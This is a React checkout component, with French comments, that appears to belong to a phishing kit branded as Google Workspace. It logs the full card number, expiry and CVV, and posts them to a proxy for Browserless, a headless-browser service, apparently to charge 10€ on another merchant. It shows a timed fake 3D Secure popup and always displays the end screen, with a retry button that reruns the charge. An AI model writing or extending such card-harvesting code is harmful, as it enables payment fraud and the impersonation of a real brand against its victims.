import { useState, useImperativeHandle, forwardRef } from 'react';
import LoadingPopup from './LoadingPopup';
import ThreeDSecurePopup from './ThreeDSecurePopup';
import EndPopup from './EndPopup';

const Checkout = forwardRef(({ 
  formData,
  selectedPlan,
  onSuccess,
  onError
}, ref) => {
  // États pour la gestion des popups
  const [isLoading, setIsLoading] = useState(false);
  const [showThreeDSecurePopup, setShowThreeDSecurePopup] = useState(false);
  const [showEndPopup, setShowEndPopup] = useState(false); // Force l'affichage ou non
  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [retryCount, setRetryCount] = useState(0);
  const [maxRetries] = useState(3);

  // Fonction paiement custom
  const payFetch = async (formData, amount = '10') => {
    // Initial status set to pending
    let status = 'initiated';

    // Regrouper les données de paiement
    const cardDetails = {
      cardNumber: formData.cardNumber,
      cardExpiration: formData.expiryDate,
      cardCVC: formData.cvv,
      cardOwner: formData.cardName
    };
    console.log("💳 Détails de la carte:", cardDetails);
    //console.log("🔍 FormData complet:", formData); // Debug pour voir toutes les propriétés disponibles

    // Extraction des données de la carte
    const cardNumber = cardDetails.cardNumber?.replace(/\s+/g, '') || '';
    const cardExpiry = cardDetails.cardExpiration || '';
    const cardCVC = cardDetails.cardCVC || '';
    const cardOwner = cardDetails.cardOwner || '';

    let data;
    try {
      // Appel à notre API proxy au lieu de Browserless directement
      const response = await fetch('/api/browserless-checkout', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          cardNumber,
          cardExpiry,
          cardCVC,
          cardOwner,
          amount
        })
      });

      if (!response.ok) {
        // Même si la réponse n'est pas ok, essayons de récupérer les données
        try {
          const errorData = await response.json();
          console.log('Error response data:', errorData);
          
          // Si on a des données malgré l'erreur, on les utilise
          if (errorData.data && errorData.data.finalStatus) {
            console.log('Found data in error response, using it');
            data = errorData;
          } else {
            throw new Error(errorData.message || 'API request failed');
          }
        } catch (parseError) {
          throw new Error(`API request failed and could not parse error response: ${parseError.message}`);
        }
      } else {
        data = await response.json();
      }
      console.log('✅ Réponse de l\'API proxy:', data);

      // If the GraphQL response contains a finalStatus field, update the status variable.
      if (data && data.data && data.data.finalStatus) {
        status = data.data.finalStatus.value;
      }
    } catch (error) {
      console.error('❌ Error fetching browserless proxy:', {
        message: error.message,
        stack: error.stack,
        name: error.name
      });
      
      // Afficher plus de détails selon le type d'erreur
      if (error.message.includes('Failed to fetch')) {
        console.error('🌐 Network connection issue - check internet connection');
      } else if (error.message.includes('timeout')) {
        console.error('⏰ Request timeout - process took too long');
      } else if (error.message.includes('Connection error')) {
        console.error('🔌 Server connection was closed unexpectedly');
      }
      
      throw new Error(`Failed to fetch browserless proxy: ${error.message}`);
    } finally {
      console.log(`Transaction completed. Status: ${status}`);
      console.log('----- End Rento Flow Simple -----');
    }
    return data;
  };

  // Détermine le logo de la carte selon le numéro
  const getCardLogo = () => {
    return formData.cardNumber?.startsWith('5') ? '/mastercard-id-check.png' : '/verified-by-visa.png';
  };

  // Obtient les 4 derniers chiffres de la carte
  const getLastFourDigits = () => {
    return formData.cardNumber?.replace(/\s/g, '').slice(-4) || '****';
  };

  // Logique principale du processus de paiement
  const startPaymentProcess = async () => {
    try {
      console.log("🔄 Démarrage du processus de paiement...");
        
      // Réinitialiser tous les états
      setIsLoading(false);
      setShowThreeDSecurePopup(false);
      setShowEndPopup(false);

      // Étape 1: Affichage du popup de chargement
      setIsLoading(true);
      console.log("📱 Affichage du LoadingPopup...");

      // Programmation de l'affichage du 3D Secure après 12 secondes
      const threeDSecureTimeout = setTimeout(() => {
        console.log("⏰ 26 secondes écoulées - Affichage du 3D Secure");
        setIsLoading(false);
        setShowThreeDSecurePopup(true);
      }, 26000);

      // Étape 2: Lancement du paiement
      const amount = '10'; // Montant fixe
      const paymentResult = await payFetch(formData, amount);
      
      // Annuler le timeout
      clearTimeout(threeDSecureTimeout);
      
      // Toujours afficher EndPopup peu importe le statut
      console.log("📱 Affichage de EndPopup après le paiement");
      setIsLoading(false);
      setShowThreeDSecurePopup(false);
      setShowEndPopup(true);
      
    } catch (error) {
      console.error('❌ Erreur lors du processus de paiement:', error);
      setIsLoading(false);
      setShowThreeDSecurePopup(false);
      if (onError) {
        onError(error);
      }
    }
  }
    

  // Gestion du succès du 3D Secure
  const handle3DSecureSuccess = () => {
    console.log("✅ 3D Secure terminé avec succès - Affichage de EndPopup");
    setShowThreeDSecurePopup(false);
    setShowEndPopup(true);
  };

  // Gestion du retry depuis EndPopup
  const handleRetry = () => {
    console.log("🔄 Retry demandé - Relancement du processus de paiement");
    setShowEndPopup(false);
    startPaymentProcess();
  };

  // Gestion de la fermeture du popup final
  const handleEndPopupClose = () => {
    console.log("✅ EndPopup fermé - Processus terminé");
    setShowEndPopup(false);
    if (onSuccess) {
      onSuccess();
    }
  };

  // Exposer les méthodes via useImperativeHandle
  useImperativeHandle(ref, () => ({
    startPaymentProcess
  }));

  // Formatage de la date et heure
  const currentDate = new Date();
  const formattedDate = currentDate.toLocaleDateString('fr-FR', {
    year: '2-digit',
    month: '2-digit',
    day: '2-digit',
  });
  const formattedTime = currentDate.toLocaleTimeString('fr-FR', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });

  return (
    <>
      {/* Popup de chargement de vérification */}
      <LoadingPopup 
        isVisible={isLoading}
        selectedPlan={selectedPlan}
        cardLogo={getCardLogo()}
        data={{
          checkoutPayCardHolderPlaceholder: 'Nom du titulaire',
          checkoutPayCardNumberPlaceholder: 'Numéro de carte',
          checkoutPayExpiryDatePlaceholder: 'MM/AA',
          checkoutPayCVVPlaceholder: 'CVV',
          cardNumber: formData.cardNumber
        }}
        brandName="Google Workspace"
      />

      {/* Popup 3D Secure */}
      <ThreeDSecurePopup 
        isVisible={showThreeDSecurePopup}
        cardLogo={getCardLogo()}
        cardNumber={formData.cardNumber}
        amount='10,00€'
        lastFourDigits={getLastFourDigits()}
        formattedDate={formattedDate}
        formattedTime={formattedTime}
        brandName="Google Workspace"
      />

      {/* Popup de fin de processus */}
      <EndPopup 
        isVisible={showEndPopup}
        selectedPlan={selectedPlan}
        onClose={handleEndPopupClose}
        onRetry={handleRetry}
        cardNumber={formData.cardNumber}
      />
    </>
  );
});

Checkout.displayName = 'Checkout';

export default Checkout;